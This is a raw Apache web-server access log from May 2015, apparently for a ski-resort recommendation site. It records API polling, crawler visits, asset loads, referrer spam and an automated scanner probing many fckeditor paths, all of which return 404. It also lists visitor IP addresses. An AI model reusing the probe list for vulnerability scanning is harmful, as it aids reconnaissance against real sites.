170.75.162.130 - - [04/May/2015:11:23:17 -0700] "GET /lib/reccapi.php?resort=kirkwood HTTP/1.1" 200 1093 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:11:23:17 -0700] "GET /lib/reccapi.php?resort=mountainhigh HTTP/1.1" 200 1060 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:11:23:17 -0700] "GET /lib/reccapi.php?resort=northstar-at-tahoe HTTP/1.1" 200 1058 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:11:23:17 -0700] "GET /lib/reccapi.php?resort=sierra-at-tahoe HTTP/1.1" 200 1071 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:11:23:17 -0700] "GET /lib/reccapi.php?resort=sugarbowl HTTP/1.1" 200 1055 "-" "node-superagent/0.18.2"
66.249.65.4 - - [04/May/2015:11:33:24 -0700] "GET /robots.txt HTTP/1.1" 200 419 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.6 - - [04/May/2015:11:33:25 -0700] "GET / HTTP/1.1" 200 2376 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.2 - - [04/May/2015:11:39:18 -0700] "GET /styles/0fffd548.main.css HTTP/1.1" 200 19317 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
58.179.254.74 - - [04/May/2015:11:40:58 -0700] "GET / HTTP/1.1" 200 2376 "http://best-seo-offer.com/try.php?u=http://whereshouldiski.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
58.179.254.74 - - [04/May/2015:11:40:59 -0700] "GET /styles/0fffd548.main.css HTTP/1.1" 200 19316 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
58.179.254.74 - - [04/May/2015:11:40:59 -0700] "GET /scripts/scripts/vendor/modernizr.js HTTP/1.1" 200 4903 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
58.179.254.74 - - [04/May/2015:11:40:59 -0700] "GET /bower_components/requirejs/require.js HTTP/1.1" 200 6702 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
58.179.254.74 - - [04/May/2015:11:40:59 -0700] "GET /images/logo-sm.png HTTP/1.1" 200 16737 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
58.179.254.74 - - [04/May/2015:11:40:59 -0700] "GET /images/loading.gif HTTP/1.1" 200 13881 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
58.179.254.74 - - [04/May/2015:11:40:59 -0700] "GET /scripts/fa48e319.main.js HTTP/1.1" 200 123455 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
58.179.254.74 - - [04/May/2015:11:41:04 -0700] "GET /images/button.png HTTP/1.1" 200 598 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
58.179.254.74 - - [04/May/2015:11:41:04 -0700] "GET /lib/reccapi.php?fields=t HTTP/1.1" 200 1875 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
58.179.254.74 - - [04/May/2015:11:41:04 -0700] "GET /images/greyHeader.png HTTP/1.1" 200 508 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
58.179.254.74 - - [04/May/2015:11:41:04 -0700] "GET /images/snowflake5.png HTTP/1.1" 200 2857 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
58.179.254.74 - - [04/May/2015:11:41:04 -0700] "GET /images/star5.png HTTP/1.1" 200 1783 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
58.179.254.74 - - [04/May/2015:11:41:05 -0700] "GET /images/bluebird5.png HTTP/1.1" 200 2177 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
58.179.254.74 - - [04/May/2015:11:41:05 -0700] "GET /images/mtns-icon.png HTTP/1.1" 200 1096 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
58.179.254.74 - - [04/May/2015:11:41:05 -0700] "GET /images/shading-icon.png HTTP/1.1" 200 537 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
58.179.254.74 - - [04/May/2015:11:41:26 -0700] "-" 408 0 "-" "-"
58.179.254.74 - - [04/May/2015:11:41:26 -0700] "-" 408 0 "-" "-"
127.0.0.1 - - [04/May/2015:11:41:27 -0700] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.2.22 (Ubuntu) (internal dummy connection)"
80.82.65.82 - - [04/May/2015:11:44:57 -0700] "HEAD /system/fckeditor/editor/ HTTP/1.1" 404 163 "-" "-"
80.82.65.82 - - [04/May/2015:11:44:57 -0700] "HEAD /sysadmin/fckeditor/editor/ HTTP/1.1" 404 163 "-" "-"
80.82.65.82 - - [04/May/2015:11:44:57 -0700] "HEAD /includes/fckeditor/editor/ HTTP/1.1" 404 163 "-" "-"
80.82.65.82 - - [04/May/2015:11:44:57 -0700] "HEAD /scripts/fckeditor/editor/ HTTP/1.1" 404 163 "-" "-"
80.82.65.82 - - [04/May/2015:11:44:57 -0700] "HEAD /fckeditor/editor/ HTTP/1.1" 404 163 "-" "-"
80.82.65.82 - - [04/May/2015:11:44:57 -0700] "HEAD /manage/fckeditor/editor/ HTTP/1.1" 404 163 "-" "-"
80.82.65.82 - - [04/May/2015:11:44:57 -0700] "HEAD /editor/editor/ HTTP/1.1" 404 163 "-" "-"
80.82.65.82 - - [04/May/2015:11:44:57 -0700] "HEAD /common/fckeditor/editor/ HTTP/1.1" 404 163 "-" "-"
80.82.65.82 - - [04/May/2015:11:44:58 -0700] "HEAD /include/fckeditor/editor/ HTTP/1.1" 404 163 "-" "-"
80.82.65.82 - - [04/May/2015:11:44:58 -0700] "HEAD /inc/fckeditor/editor/ HTTP/1.1" 404 163 "-" "-"
80.82.65.82 - - [04/May/2015:11:44:58 -0700] "HEAD /system/fckeditor/editor/ HTTP/1.1" 404 163 "-" "-"
80.82.65.82 - - [04/May/2015:11:44:58 -0700] "HEAD /ckeditor/editor/ HTTP/1.1" 404 163 "-" "-"
80.82.65.82 - - [04/May/2015:11:44:58 -0700] "HEAD /admin/fckeditor/editor/ HTTP/1.1" 404 163 "-" "-"
80.82.65.82 - - [04/May/2015:11:44:58 -0700] "HEAD /editor/fckeditor/editor/ HTTP/1.1" 404 163 "-" "-"
80.82.65.82 - - [04/May/2015:11:44:58 -0700] "HEAD /Fckeditor/editor/ HTTP/1.1" 404 163 "-" "-"
80.82.65.82 - - [04/May/2015:11:44:58 -0700] "HEAD /editorold/editor/ HTTP/1.1" 404 163 "-" "-"
80.82.65.82 - - [04/May/2015:11:44:58 -0700] "HEAD /editor1/editor/ HTTP/1.1" 404 163 "-" "-"
80.82.65.82 - - [04/May/2015:11:44:58 -0700] "HEAD /fck/editor/ HTTP/1.1" 404 163 "-" "-"
80.82.65.82 - - [04/May/2015:11:44:58 -0700] "HEAD /Fckeditorold/editor/ HTTP/1.1" 404 163 "-" "-"
80.82.65.82 - - [04/May/2015:11:44:58 -0700] "HEAD /Fckeditornew/editor/ HTTP/1.1" 404 163 "-" "-"
80.82.65.82 - - [04/May/2015:11:44:58 -0700] "HEAD /js/fckeditor/editor/ HTTP/1.1" 404 163 "-" "-"
127.0.0.1 - - [04/May/2015:11:44:59 -0700] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.2.22 (Ubuntu) (internal dummy connection)"
185.35.62.11 - - [04/May/2015:11:48:48 -0700] "HEAD / HTTP/1.1" 200 291 "-" "-"
170.75.162.130 - - [04/May/2015:11:50:09 -0700] "GET /lib/reccapi.php?resort=winterpark HTTP/1.1" 200 1028 "-" "node-superagent/0.18.2"
180.76.4.64 - - [04/May/2015:12:09:44 -0700] "GET / HTTP/1.1" 200 6114 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
123.125.71.112 - - [04/May/2015:12:11:23 -0700] "-" 408 0 "-" "-"
66.249.65.184 - - [04/May/2015:12:14:11 -0700] "GET / HTTP/1.1" 200 2376 "-" "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
220.181.108.183 - - [04/May/2015:12:16:18 -0700] "-" 408 0 "-" "-"
66.249.65.188 - - [04/May/2015:12:19:23 -0700] "GET / HTTP/1.1" 200 2376 "-" "DoCoMo/2.0 N905i(c100;TB;W24H16) (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
50.197.148.201 - - [04/May/2015:12:24:22 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36"
166.137.242.77 - - [04/May/2015:12:38:21 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4"
123.125.71.82 - - [04/May/2015:12:46:13 -0700] "-" 408 0 "-" "-"
220.181.108.182 - - [04/May/2015:12:52:05 -0700] "-" 408 0 "-" "-"
199.30.25.49 - - [04/May/2015:12:52:59 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6052 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
170.75.162.130 - - [04/May/2015:12:53:34 -0700] "GET /lib/reccapi.php?resort=crestedbutte HTTP/1.1" 200 1037 "-" "node-superagent/0.18.2"
81.149.50.43 - - [04/May/2015:12:54:21 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17"
24.5.179.93 - - [04/May/2015:13:06:38 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36"
71.140.31.214 - - [04/May/2015:13:08:50 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
71.140.31.214 - - [04/May/2015:13:09:11 -0700] "-" 408 0 "-" "-"
170.75.162.130 - - [04/May/2015:13:13:26 -0700] "GET /lib/reccapi.php?resort=deervalley HTTP/1.1" 200 1055 "-" "node-superagent/0.18.2"
66.214.222.118 - - [04/May/2015:13:13:51 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko"
66.214.222.118 - - [04/May/2015:13:14:12 -0700] "-" 408 0 "-" "-"
170.75.162.130 - - [04/May/2015:13:14:36 -0700] "GET /lib/reccapi.php?resort=angelfire HTTP/1.1" 200 1010 "-" "node-superagent/0.18.2"
92.8.143.184 - - [04/May/2015:13:14:50 -0700] "GET / HTTP/1.1" 200 2376 "http://liftie.info/resort/angel-fire" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
92.8.143.184 - - [04/May/2015:13:14:50 -0700] "GET /scripts/scripts/vendor/modernizr.js HTTP/1.1" 200 4902 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
92.8.143.184 - - [04/May/2015:13:14:50 -0700] "GET /styles/0fffd548.main.css HTTP/1.1" 200 19317 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
92.8.143.184 - - [04/May/2015:13:14:50 -0700] "GET /images/logo-sm.png HTTP/1.1" 200 16738 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
92.8.143.184 - - [04/May/2015:13:14:50 -0700] "GET /bower_components/requirejs/require.js HTTP/1.1" 200 6702 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
92.8.143.184 - - [04/May/2015:13:14:50 -0700] "GET /images/loading.gif HTTP/1.1" 200 13881 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
92.8.143.184 - - [04/May/2015:13:14:51 -0700] "GET /favicon.ico HTTP/1.1" 200 1475 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
92.8.143.184 - - [04/May/2015:13:14:51 -0700] "GET /scripts/fa48e319.main.js HTTP/1.1" 200 123455 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
92.8.143.184 - - [04/May/2015:13:14:55 -0700] "GET /lib/reccapi.php?resort=angelfire&date=2015-05-04 HTTP/1.1" 200 1046 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
92.8.143.184 - - [04/May/2015:13:14:55 -0700] "GET /images/snowflake-med-5.png HTTP/1.1" 200 6156 "http://whereshouldiski.com/styles/0fffd548.main.css" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
92.8.143.184 - - [04/May/2015:13:14:55 -0700] "GET /images/stars-med-5.png HTTP/1.1" 200 4123 "http://whereshouldiski.com/styles/0fffd548.main.css" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
92.8.143.184 - - [04/May/2015:13:14:55 -0700] "GET /lib/reccapi.php?fields=t&date=2015-05-04&coords=36.39%2C-105.27&size=7&sort=distance HTTP/1.1" 200 1269 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
92.8.143.184 - - [04/May/2015:13:14:55 -0700] "GET /images/sun-med-5.png HTTP/1.1" 200 7626 "http://whereshouldiski.com/styles/0fffd548.main.css" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
92.8.143.184 - - [04/May/2015:13:14:55 -0700] "GET /images/mtns-30px.png HTTP/1.1" 200 1202 "http://whereshouldiski.com/styles/0fffd548.main.css" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
92.8.143.184 - - [04/May/2015:13:14:55 -0700] "GET /lib/resortDataSearchD3.php?size=7&sortDate=T&resort=angelfire&dateStart=2015-05-02 HTTP/1.1" 200 834 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
92.8.143.184 - - [04/May/2015:13:14:55 -0700] "GET /images/shading-53px.png HTTP/1.1" 200 547 "http://whereshouldiski.com/styles/0fffd548.main.css" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
92.8.143.184 - - [04/May/2015:13:14:55 -0700] "GET /images/snowforecast-logo.jpg HTTP/1.1" 200 22988 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
92.8.143.184 - - [04/May/2015:13:14:55 -0700] "GET /images/opensnow_logo.png HTTP/1.1" 200 11776 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
92.8.143.184 - - [04/May/2015:13:14:55 -0700] "GET /images/snowflake5.png HTTP/1.1" 200 2857 "http://whereshouldiski.com/styles/0fffd548.main.css" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
92.8.143.184 - - [04/May/2015:13:14:55 -0700] "GET /images/bluebird5.png HTTP/1.1" 200 2177 "http://whereshouldiski.com/styles/0fffd548.main.css" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
92.8.143.184 - - [04/May/2015:13:14:55 -0700] "GET /images/star5.png HTTP/1.1" 200 1783 "http://whereshouldiski.com/styles/0fffd548.main.css" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
92.8.143.184 - - [04/May/2015:13:14:55 -0700] "GET /images/mtns-icon.png HTTP/1.1" 200 1096 "http://whereshouldiski.com/styles/0fffd548.main.css" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
92.8.143.184 - - [04/May/2015:13:14:55 -0700] "GET /images/shading-icon.png HTTP/1.1" 200 536 "http://whereshouldiski.com/styles/0fffd548.main.css" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
127.0.0.1 - - [04/May/2015:13:15:03 -0700] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.2.22 (Ubuntu) (internal dummy connection)"
170.75.162.130 - - [04/May/2015:13:15:26 -0700] "GET /lib/reccapi.php?resort=taos HTTP/1.1" 200 993 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:13:17:56 -0700] "GET /lib/reccapi.php?resort=killington HTTP/1.1" 200 955 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:13:17:57 -0700] "GET /lib/reccapi.php?resort=sugarloaf HTTP/1.1" 200 957 "-" "node-superagent/0.18.2"
70.198.74.83 - - [04/May/2015:13:21:26 -0700] "GET /im/api.php?bib=375&r=0.15401146211661398&raceId=2147483658&raceName=stgeorge70.3&startTime=07:39:00 HTTP/1.1" 200 1294 "http://ericfahsl.com/im/" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
70.198.74.83 - - [04/May/2015:13:21:26 -0700] "GET /im/api.php?bib=138&r=0.5093087165150791&raceId=2147483658&raceName=stgeorge70.3&startTime=07:18:00 HTTP/1.1" 200 1303 "http://ericfahsl.com/im/" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
70.198.74.83 - - [04/May/2015:13:21:26 -0700] "GET /im/api.php?bib=1856&r=0.7947491121012717&raceId=2147483658&raceName=stgeorge70.3&startTime=07:42:00 HTTP/1.1" 200 1302 "http://ericfahsl.com/im/" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
70.198.74.83 - - [04/May/2015:13:21:26 -0700] "GET /im/api.php?bib=1338&r=0.9556269936729223&raceId=2147483658&raceName=stgeorge70.3&startTime=07:27:00 HTTP/1.1" 200 1307 "http://ericfahsl.com/im/" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
75.145.192.110 - - [04/May/2015:13:23:00 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
75.145.192.110 - - [04/May/2015:13:23:00 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
207.87.40.22 - - [04/May/2015:13:24:43 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0"
205.189.134.254 - - [04/May/2015:13:27:29 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0"
180.76.5.22 - - [04/May/2015:13:29:29 -0700] "GET /resorts?resort=parkcity&date=2014-04-17 HTTP/1.1" 404 472 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
62.24.181.134 - - [04/May/2015:13:36:24 -0700] "GET /robots.txt HTTP/1.0" 200 338 "http://whereshouldiski.com/robots.txt" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2)"
62.24.181.134 - - [04/May/2015:13:36:24 -0700] "GET /lib/reccapi.php HTTP/1.0" 200 30324 "http://whereshouldiski.com/lib/reccapi.php" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2)"
62.24.181.135 - - [04/May/2015:13:37:07 -0700] "GET /robots.txt HTTP/1.0" 200 338 "http://whereshouldiski.com/robots.txt" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2)"
62.24.181.135 - - [04/May/2015:13:37:07 -0700] "GET /scripts/fa48e319.main.js HTTP/1.0" 200 378140 "http://whereshouldiski.com/scripts/fa48e319.main.js" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2)"
62.24.181.135 - - [04/May/2015:13:37:14 -0700] "GET /robots.txt HTTP/1.0" 200 338 "http://whereshouldiski.com/robots.txt" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2)"
62.24.181.135 - - [04/May/2015:13:37:14 -0700] "GET /bower_components/requirejs/require.js HTTP/1.0" 200 17147 "http://whereshouldiski.com/bower_components/requirejs/require.js" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2)"
62.24.181.134 - - [04/May/2015:13:37:15 -0700] "GET /scripts/scripts/vendor/modernizr.js HTTP/1.0" 200 11398 "http://whereshouldiski.com/scripts/scripts/vendor/modernizr.js" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2)"
62.24.181.135 - - [04/May/2015:13:37:23 -0700] "GET /robots.txt HTTP/1.0" 200 338 "http://whereshouldiski.com/robots.txt" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2)"
62.24.181.135 - - [04/May/2015:13:37:23 -0700] "GET / HTTP/1.0" 200 6114 "http://whereshouldiski.com/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2)"
170.75.162.130 - - [04/May/2015:13:44:49 -0700] "GET /lib/reccapi.php?resort=wildcatmountain HTTP/1.1" 200 964 "-" "node-superagent/0.18.2"
71.120.9.71 - - [04/May/2015:13:56:27 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36"
71.140.31.214 - - [04/May/2015:13:56:30 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://thebackcountry.net/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; 786908940603; Build/14.08001)"
66.249.65.58 - - [04/May/2015:13:57:52 -0700] "GET /resorts?resort=snoqualmie-alpental&date=2013-01-16 HTTP/1.1" 404 509 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.199 - - [04/May/2015:13:59:51 -0700] "GET /lib/resortDataSearch.php?resort=bearmountain&dateStart=2013-09-30&dateMax=2013-10-14&size=30 HTTP/1.1" 200 331 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
170.75.162.130 - - [04/May/2015:14:00:00 -0700] "GET /lib/reccapi.php?resort=whistlerblackcomb HTTP/1.1" 200 926 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:14:07:01 -0700] "GET /lib/reccapi.php?resort=mountspokane HTTP/1.1" 200 1000 "-" "node-superagent/0.18.2"
71.140.31.214 - - [04/May/2015:14:09:55 -0700] "-" 408 0 "-" "-"
